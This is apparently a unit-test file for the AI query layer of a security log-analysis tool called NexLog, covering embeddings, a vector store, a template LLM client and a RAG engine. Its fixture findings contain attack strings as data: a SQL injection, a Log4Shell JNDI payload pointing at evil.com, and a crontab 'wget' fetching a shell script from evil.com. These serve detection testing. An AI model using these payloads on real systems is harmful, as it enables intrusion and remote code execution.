"""
tests/unit/test_ai.py â€” NexLog AI Layer
Test suite for ai/:
  embedder.py        â€” finding_to_text, Embedder (all tiers)
  vector_store.py    â€” VectorStore (numpy+sqlite backend)
  llm_client.py      â€” LLMClient (tier 3 template synthesis)
  rag_engine.py      â€” RAGEngine (index + query + stream)
  query_interface.py â€” AIQueryEngine (full integration)
  ai/__init__.py     â€” package exports

Run: python test_ai.py  (from any directory)
"""

import json
import os
import sys
import tempfile
from datetime import datetime, timezone

# â”€â”€ Self-locating path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT
for _p in ['core', 'detection', 'storage', 'intelligence', 'ai']:
    sys.path.insert(0, os.path.join(_ROOT, _p))
sys.path.insert(0, _ROOT)

import numpy as np
from finding import Finding, Severity, MitreTag
from embedder     import Embedder, finding_to_text
from vector_store import VectorStore, SearchResult
from llm_client   import LLMClient, _template_synthesise
from rag_engine   import RAGEngine, RAGAnswer, _build_context
from query_interface import AIQueryEngine, ConversationHistory, ConversationTurn

# â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_passed = _failed = 0

def check(name: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1; print(f"  PASS  {name}")
    else:
        _failed += 1; print(f"  FAIL  {name}" + (f"  [{detail}]" if detail else ""))

_TS = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

def _make_findings(n: int = 5) -> list[Finding]:
    templates = [
        ("WEB-001","SQL Injection","SQLi in login",       Severity.HIGH,     0.90,"web_attack",
         "TA0001","Initial Access","T1190","Exploit",".001",
         "203.0.113.5","web01","GET /login?q=admin OR 1=1"),
        ("AUTH-001","SSH Brute Force","5+ failed SSH",    Severity.CRITICAL, 0.95,"auth",
         "TA0006","Credential Access","T1110","Brute Force",".001",
         "185.220.100.5","bastion","Failed password for root"),
        ("DISC-008","Log4Shell","JNDI injection",         Severity.CRITICAL, 0.96,"discovery",
         "TA0001","Initial Access","T1190","Exploit",None,
         "1.2.3.4","app01","${jndi:ldap://evil.com/x}"),
        ("PERS-001","Cron Backdoor","wget in crontab",    Severity.HIGH,     0.85,"persistence",
         "TA0003","Persistence","T1053","Scheduled Task",".003",
         "10.0.0.5","server01","wget http://evil.com/shell.sh"),
        ("RECON-001","Port Scan","Nmap scan detected",    Severity.MEDIUM,   0.80,"recon",
         "TA0043","Reconnaissance","T1595","Active Scanning",None,
         "9.9.9.9","web01","Nmap scan report for 10.0.0.0/24"),
    ]
    result = []
    for t in templates[:n]:
        (rid,rname,desc,sev,conf,cat,
         tac_id,tac_name,tech_id,tech_name,sub,
         src_ip,hostname,trigger) = t
        result.append(Finding(
            rule_id=rid, rule_name=rname, description=desc,
            severity=sev, confidence=conf, category=cat,
            mitre_tags=[MitreTag(tac_id,tac_name,tech_id,tech_name,sub)],
            source_ip=src_ip, hostname=hostname, timestamp=_TS,
            trigger_line=trigger, supporting_lines=[],
        ))
    return result


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. finding_to_text
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_finding_to_text():
    print("\nâ”€â”€ 1. finding_to_text â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    f    = _make_findings(1)[0]
    text = finding_to_text(f)
    check("returns non-empty string",     isinstance(text, str) and len(text) > 50)
    check("contains rule_id",             "WEB-001" in text)
    check("contains rule_name",           "SQL Injection" in text)
    check("contains severity",            "HIGH" in text)
    check("contains source_ip",           "203.0.113.5" in text)
    check("contains hostname",            "web01" in text)
    check("contains MITRE id",            "T1190" in text)
    check("contains trigger_line",        "admin" in text or "OR" in text)
    check("contains timestamp",           "2026" in text)

    # None/missing fields handled gracefully
    f2   = Finding("X-001","Test","desc",Severity.LOW,0.5,"cat",
                   mitre_tags=[],source_ip=None,hostname=None,timestamp=None)
    text2 = finding_to_text(f2)
    check("missing fields: no crash",     len(text2) > 10)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. Embedder â€” hash fallback (tier 4)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_embedder_hash_fallback():
    print("\nâ”€â”€ 2. Embedder tier 4 (hash fallback) â”€â”€â”€â”€â”€â”€â”€")
    e = Embedder(force_tier=4)
    check("tier = 4",                     e.tier == 4)
    check("tier_name contains hash",      "hash" in e.tier_name)
    check("dim = 256",                    e.dim == 256)

    # Single embed
    vec = e.embed("test security finding SQL injection")
    check("embed shape (256,)",           vec.shape == (256,))
    check("embed is unit-norm",           abs(np.linalg.norm(vec) - 1.0) < 1e-5)

    # Batch embed
    texts = ["SQL injection", "SSH brute force", "port scan"]
    vecs  = e.embed_batch(texts)
    check("embed_batch shape (3,256)",    vecs.shape == (3, 256))
    check("all unit-norm",                all(abs(np.linalg.norm(v)-1.0) < 1e-5 for v in vecs))

    # Deterministic
    v1 = e.embed("same text")
    v2 = e.embed("same text")
    check("deterministic output",         np.allclose(v1, v2))

    # Different texts â†’ different vectors
    vd = e.embed("completely different words unrelated")
    check("different texts differ",       not np.allclose(vec, vd))

    # Empty batch
    empty = e.embed_batch([])
    check("empty batch shape (0,256)",    empty.shape == (0, 256))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3. Embedder â€” TF-IDF (tier 3, default)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_embedder_tfidf():
    print("\nâ”€â”€ 3. Embedder tier 3 (TF-IDF) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    e = Embedder(force_tier=3, max_features=512)
    check("tier = 3",                     e.tier == 3)
    check("tier_name contains tfidf",     "tfidf" in e.tier_name.lower())

    findings = _make_findings(5)
    vecs = e.embed_findings(findings)
    check("embed_findings shape (5, D)",  vecs.shape[0] == 5)
    check("dim after fit > 0",            e.dim > 0 and e.dim <= 512)
    check("all unit-norm",                all(abs(np.linalg.norm(v)-1.0)<1e-5
                                              for v in vecs))

    # Query uses same vocabulary (no dim mismatch)
    q_vec = e.embed("SQL injection login page attack")
    check("query dim matches corpus dim", q_vec.shape == (e.dim,))
    check("query is unit-norm",           abs(np.linalg.norm(q_vec) - 1.0) < 1e-5)

    # Semantic: SQL injection finding should score higher for SQL query
    sql_score   = float(np.dot(q_vec, vecs[0]))  # WEB-001
    brute_score = float(np.dot(q_vec, vecs[1]))  # AUTH-001
    check("SQL query ranks SQL finding higher", sql_score > brute_score,
          f"sql={sql_score:.3f} brute={brute_score:.3f}")

    # embed_finding convenience wrapper
    v = e.embed_finding(findings[0])
    check("embed_finding same as index 0", np.allclose(v, vecs[0], atol=1e-5))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 4. VectorStore â€” numpy+sqlite backend
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_vector_store_numpy():
    print("\nâ”€â”€ 4. VectorStore (numpy+sqlite) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    findings = _make_findings(5)
    emb      = Embedder(force_tier=3)

    with tempfile.TemporaryDirectory() as tmpdir:
        store = VectorStore(persist_path=tmpdir, force_numpy=True)
        check("backend = numpy+sqlite",   "numpy" in store.backend)

        # add_findings
        n = store.add_findings(findings, emb, session_id="s1")
        check("adds 5 findings",          n == 5)
        check("count = 5",                store.count() == 5)

        # Idempotent
        n2 = store.add_findings(findings[:2], emb, session_id="s1")
        check("idempotent (no growth)",   store.count() == 5)

        # query_text
        results = store.query_text("SQL injection login", emb, top_k=3)
        check("returns list",             isinstance(results, list))
        check("top_k=3 respected",        len(results) == 3)
        check("result is SearchResult",   isinstance(results[0], SearchResult))
        check("WEB-001 top for SQL",
              results[0].metadata.get("rule_id") == "WEB-001",
              f"got {results[0].metadata.get('rule_id')}")

        # SearchResult structure
        r = results[0]
        check("has doc_id",               bool(r.doc_id))
        check("has text",                 bool(r.text))
        check("score in [0,1]",           0 <= r.score <= 1.0)
        check("has metadata",             isinstance(r.metadata, dict))
        d = r.to_dict()
        check("to_dict has rule_id",      "rule_id" in d)
        check("to_dict has score",        "score" in d)

        # Metadata filter
        results_auth = store.query_text(
            "brute force login SSH", emb, top_k=3,
            filter_meta={"category": "auth"})
        check("category filter works",
              all(r.metadata.get("category") == "auth"
                  for r in results_auth if r.score > -999))

        # delete
        to_del = store._backend._ids[0]
        removed = store.delete([to_del])
        check("delete returns 1",         removed == 1)
        check("count decreases",          store.count() == 4)

        # reset
        store.reset()
        check("reset â†’ count 0",          store.count() == 0)

        # Persistence: reload from SQLite
        store.add_findings(findings, emb, session_id="s2")
        store.close()

        store2 = VectorStore(persist_path=tmpdir, force_numpy=True)
        check("reloaded count = 5",       store2.count() == 5)
        r2 = store2.query_text("SQL injection", emb, top_k=1)
        check("query after reload",       len(r2) == 1)
        store2.close()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5. LLMClient â€” tier 3 template synthesis
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_llm_client_template():
    print("\nâ”€â”€ 5. LLMClient tier 3 (template) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    llm = LLMClient(force_tier=3)
    check("tier = 3",                     llm.tier == 3)
    check("tier_name = template",         "template" in llm.tier_name)

    context = (
        "Rule WEB-001 SQL Injection. Severity HIGH category web_attack risk score 6.3.\n"
        "Source IP 203.0.113.5. Hostname web01.\n"
        "MITRE T1190.001 Initial Access Exploit App.\n"
        "Trigger line GET /login?q=admin OR 1=1.\n\n"
        "Rule AUTH-001 SSH Brute Force. Severity CRITICAL category auth risk score 9.5.\n"
        "Source IP 185.220.100.5. Hostname bastion.\n"
        "MITRE T1110.001 Credential Access Brute Force.\n"
        "Trigger line Failed password for root from 185.220.100.5.\n"
    )

    test_cases = [
        ("What IP addresses are attacking?",      "203.0.113.5"),
        ("What is the highest severity?",         "CRITICAL"),
        ("What MITRE techniques were observed?",  "T1190"),
        ("Which hosts are targeted?",             "web01"),
        ("How many findings are there?",          "2"),
        ("Give me a summary of the attack",       "185.220.100.5"),
    ]
    for q, expected in test_cases:
        ans = llm.generate(q, context)
        check(f"Q: {q[:35]}",             expected in ans,
              f"missing {expected!r} in: {ans[:80]}")

    # auto-select without Ollama/API key â†’ tier 3
    llm2 = LLMClient()
    check("auto-selects tier 3",          llm2.tier == 3)

    # stream yields single chunk for tier 3
    chunks = list(llm.stream("What IPs?", context))
    check("stream: 1 chunk",              len(chunks) == 1)
    check("stream: correct content",      "203.0.113.5" in chunks[0])

    # Empty context gracefully
    ans_empty = llm.generate("What happened?", "")
    check("empty context: no crash",      isinstance(ans_empty, str))


def test_llm_client_gemini_selection():
    print("\nâ”€â”€ 5b. LLMClient Gemini selection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    old = os.environ.get("GEMINI_API_KEY")
    os.environ["GEMINI_API_KEY"] = "test-key"
    try:
        llm = LLMClient(force_tier=5)
        check("tier = 5 for Gemini",           llm.tier == 5)
        check("tier_name has gemini",          "gemini" in llm.tier_name.lower())
        check("repr includes tier",            "tier=5" in repr(llm))
    finally:
        if old is None:
            os.environ.pop("GEMINI_API_KEY", None)
        else:
            os.environ["GEMINI_API_KEY"] = old


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 6. _template_synthesise â€” edge cases
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_template_synthesise():
    print("\nâ”€â”€ 6. _template_synthesise edge cases â”€â”€â”€â”€â”€â”€â”€â”€")
    ctx = (
        "Rule WEB-001 SQL Injection. Severity HIGH risk score 7.5.\n"
        "Source IP 1.2.3.4. Hostname web01. MITRE T1190.001.\n"
        "Rule MAL-001 Malware. Severity CRITICAL risk score 9.0.\n"
        "Source IP 5.6.7.8. Hostname app01. MITRE T1059.001.\n"
    )

    # Each query type
    for q, expected in [
        ("What attacker IPs are there?",          "1.2.3.4"),
        ("How many critical findings?",           "CRITICAL"),
        ("List MITRE techniques",                  "T1190"),
        ("What machines are affected?",            "web01"),
        ("Count the total findings",               "2"),
        ("What is the most serious thing?",        "9.0"),
    ]:
        ans = _template_synthesise(q, ctx)
        check(f"synthesise: {q[:35]}", expected in ans,
              f"missing {expected!r} in: {ans[:80]}")

    # Risk score regex should not crash on score "9.0."
    ctx2 = "Rule X. risk score 9.0. Severity CRITICAL."
    ans2 = _template_synthesise("summary", ctx2)
    check("trailing period in score: no crash", isinstance(ans2, str))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 7. RAGEngine â€” full pipeline
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_rag_engine():
    print("\nâ”€â”€ 7. RAGEngine pipeline â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    findings = _make_findings(5)

    with tempfile.TemporaryDirectory() as tmpdir:
        rag = RAGEngine(persist_path=tmpdir)

        # Empty store query
        ans0 = rag.query("What happened?")
        check("empty store: graceful",    "indexed" in ans0.text.lower() or
                                          "No findings" in ans0.text)
        check("empty store: no sources",  len(ans0.sources) == 0)

        # Index
        n = rag.index_findings(findings, session_id="s1")
        check("indexed 5",                n == 5)
        check("n_indexed = 5",            rag.n_indexed == 5)

        # Query
        ans = rag.query("What SQL injection attacks happened?", top_k=5)
        check("returns RAGAnswer",        isinstance(ans, RAGAnswer))
        check("has text",                 len(ans.text) > 10)
        check("has sources",              len(ans.sources) > 0)
        check("retrieval_ms >= 0",        ans.retrieval_ms >= 0)
        check("generation_ms >= 0",       ans.generation_ms >= 0)
        check("llm_tier set",             bool(ans.llm_tier))
        check("embedder_tier set",        bool(ans.embedder_tier))
        check("n_indexed set",            ans.n_indexed == 5)
        check("WEB-001 in sources",
              any(s["rule_id"] == "WEB-001" for s in ans.sources))

        # Source citation fields
        src = ans.sources[0]
        for field in ["doc_id","rule_id","rule_name","severity",
                      "category","source_ip","hostname","score"]:
            check(f"source has {field}",  field in src)

        # to_dict
        d = ans.to_dict()
        for key in ["text","sources","query","retrieval_ms",
                    "generation_ms","total_ms","llm_tier"]:
            check(f"to_dict has {key}",   key in d)
        check("total_ms = r+g",
              d["total_ms"] == d["retrieval_ms"] + d["generation_ms"])

        # Severity filter
        ans_hi = rag.query("What happened?", severity="CRITICAL", top_k=5)
        check("severity filter: no crash", isinstance(ans_hi, RAGAnswer))

        # Stream
        chunks = list(rag.stream_query("Summary of attacks"))
        text   = "".join(c for c in chunks if "__SOURCES__" not in c)
        meta_c = [c for c in chunks if "__SOURCES__:" in c]
        check("stream has text",          len(text) > 10)
        check("stream has __SOURCES__",   len(meta_c) == 1)
        meta = json.loads(meta_c[0].split("__SOURCES__:", 1)[1])
        check("stream meta has sources",  "sources" in meta)
        check("stream meta has timing",   "retrieval_ms" in meta)

        # Idempotent re-index
        n2 = rag.index_findings(findings, session_id="s1")
        check("idempotent reindex",       rag.n_indexed == 5)

        # Status
        s = rag.status()
        check("status n_indexed",         s["n_indexed"] == 5)
        check("status embedder",          "embedder" in s)
        check("status llm",               "llm" in s)
        check("status vector_store",      "vector_store" in s)

        # Reset
        rag.reset_index()
        check("reset_index â†’ 0",          rag.n_indexed == 0)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 8. AIQueryEngine â€” integration
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_ai_query_engine():
    print("\nâ”€â”€ 8. AIQueryEngine integration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    findings = _make_findings(5)

    with tempfile.TemporaryDirectory() as tmpdir:
        engine = AIQueryEngine(persist_path=tmpdir)
        check("repr works",               "AIQueryEngine" in repr(engine))

        # Index directly
        n = engine.index_findings_directly(findings, session_id="s1")
        check("indexed 5",                n == 5)
        check("n_indexed = 5",            engine.rag.n_indexed == 5)

        # ask()
        ans = engine.ask("What IPs are attacking?")
        check("ask returns RAGAnswer",    isinstance(ans, RAGAnswer))
        check("answer has text",          len(ans.text) > 5)
        check("answer has sources",       len(ans.sources) > 0)

        # Conversation history accumulates
        check("history after 1 turn",    len(engine.history) == 1)
        ans2 = engine.ask("What severity?")
        check("history after 2 turns",   len(engine.history) == 2)

        # History is injected into next query (no crash)
        ans3 = engine.ask("And the MITRE techniques?", use_history=True)
        check("history context: no crash",len(ans3.text) > 5)

        # ask_dict
        d = engine.ask_dict("Summary", use_history=False)
        check("ask_dict returns dict",    isinstance(d, dict))
        check("ask_dict has text",        "text" in d)
        check("ask_dict has sources",     "sources" in d)
        check("ask_dict has llm_tier",    "llm_tier" in d)

        # ask_stream
        chunks = list(engine.ask_stream("What IPs?"))
        text   = "".join(c for c in chunks if "__SOURCES__" not in c)
        check("ask_stream has text",      len(text) > 5)

        # Status
        s = engine.status()
        check("status n_indexed",         s["n_indexed"] == 5)
        check("status llm_tier",          "llm_tier" in s)
        check("status embedder_tier",     "embedder_tier" in s)
        check("status conversation_turns",s["conversation_turns"] >= 2)
        check("status recommendations",   isinstance(s["recommendations"], list))

        # clear_history
        engine.clear_history()
        check("clear_history â†’ 0",        len(engine.history) == 0)

        # get_history
        engine.ask("Test question")
        hist = engine.get_history()
        check("get_history returns list",  isinstance(hist, list))
        check("get_history has turn",      len(hist) == 1)
        check("turn has question",         "question" in hist[0])
        check("turn has answer",           "answer" in hist[0])

        # reset
        engine.reset()
        check("reset â†’ 0 indexed",        engine.rag.n_indexed == 0)
        check("reset â†’ 0 history",        len(engine.history) == 0)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 9. ConversationHistory
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_conversation_history():
    print("\nâ”€â”€ 9. ConversationHistory â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    hist = ConversationHistory(max_turns=3)
    check("initial len = 0",             len(hist) == 0)

    for i in range(5):
        hist.add(ConversationTurn(
            question=f"Q{i}", answer=f"A{i}", sources=[]))

    check("max_turns=3 enforced",        len(hist) == 3)
    check("oldest evicted",              hist._turns[0].question == "Q2")

    prefix = hist.as_context_prefix()
    check("prefix is string",            isinstance(prefix, str))
    check("prefix contains Q",           "Q" in prefix)
    check("prefix non-empty",            len(prefix) > 10)

    hist.clear()
    check("clear â†’ 0",                   len(hist) == 0)
    check("empty prefix = empty str",    hist.as_context_prefix() == "")

    all_t = hist.all_turns()
    check("all_turns = []",              all_t == [])


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 10. ai/__init__.py package exports
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_ai_package_exports():
    print("\nâ”€â”€ 10. ai package exports â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    import ai as ai_pkg
    exports = [
        "AIQueryEngine", "ConversationHistory", "ConversationTurn",
        "RAGEngine", "RAGAnswer",
        "Embedder", "VectorStore", "SearchResult", "LLMClient",
        "finding_to_text",
    ]
    for name in exports:
        check(f"{name} exported",        hasattr(ai_pkg, name))

    # Quick smoke test: import via package
    check("AIQueryEngine importable",    True)
    check("Embedder importable",         True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 11. _build_context
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_build_context():
    print("\nâ”€â”€ 11. _build_context â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    findings = _make_findings(3)
    emb      = Embedder(force_tier=4)

    with tempfile.TemporaryDirectory() as d:
        store = VectorStore(persist_path=d, force_numpy=True)
        store.add_findings(findings, emb)
        results = store.query_text("SQL injection", emb, top_k=3)

    ctx = _build_context(results)
    check("context is string",            isinstance(ctx, str))
    check("context has Finding blocks",   "[Finding" in ctx)
    check("context has Rule",             "Rule" in ctx)
    check("context has Severity",         "Severity" in ctx)
    check("context has Evidence",         "Evidence" in ctx)

    # Truncation
    ctx_short = _build_context(results, max_chars=100)
    check("truncation works",             len(ctx_short) <= 150)  # max_chars + marker
    check("truncation marker present",    "[context truncated]" in ctx_short)

    # Empty
    ctx_empty = _build_context([])
    check("empty results â†’ empty str",   ctx_empty == "")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 12. Full end-to-end with CaseDB
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_full_pipeline_with_casedb():
    print("\nâ”€â”€ 12. Full pipeline with CaseDB â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    from case_db import CaseDB

    findings = _make_findings(5)

    with (tempfile.NamedTemporaryFile(suffix=".facase", delete=False) as f,
          tempfile.TemporaryDirectory() as ai_dir):
        db_path = f.name

    try:
        with CaseDB(db_path) as db:
            sid = db.create_session(source_file="test.log",
                                    sha256="a"*64, file_size=4096)
            db.save_findings(findings, sid)

        engine = AIQueryEngine(
            case_db_path=db_path, persist_path=ai_dir)

        with CaseDB(db_path) as db:
            n = engine.ensure_indexed(db, session_id=sid)
        check("ensure_indexed returns count", n == 5)
        check("n_indexed after index",        engine.rag.n_indexed == 5)

        # Idempotent
        with CaseDB(db_path) as db:
            n2 = engine.ensure_indexed(db, session_id=sid)
        check("idempotent ensure_indexed",    n2 == 0)

        ans = engine.ask("What attacks were detected?")
        check("ask after CaseDB index",       isinstance(ans, RAGAnswer))
        check("answer has text",              len(ans.text) > 10)

        engine.close()

    finally:
        try: os.unlink(db_path)
        except: pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# main
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
if __name__ == "__main__":
    print("=" * 62)
    print("  NexLog AI Layer â€” Test Suite")
    print("=" * 62)

    test_finding_to_text()
    test_embedder_hash_fallback()
    test_embedder_tfidf()
    test_vector_store_numpy()
    test_llm_client_template()
    test_llm_client_gemini_selection()
    test_template_synthesise()
    test_rag_engine()
    test_ai_query_engine()
    test_conversation_history()
    test_ai_package_exports()
    test_build_context()
    test_full_pipeline_with_casedb()

    print(f"\n{'=' * 62}")
    print(f"  Results:  {_passed} passed Â· {_failed} failed")
    print(f"{'=' * 62}")
    if _failed:
        raise SystemExit(1)
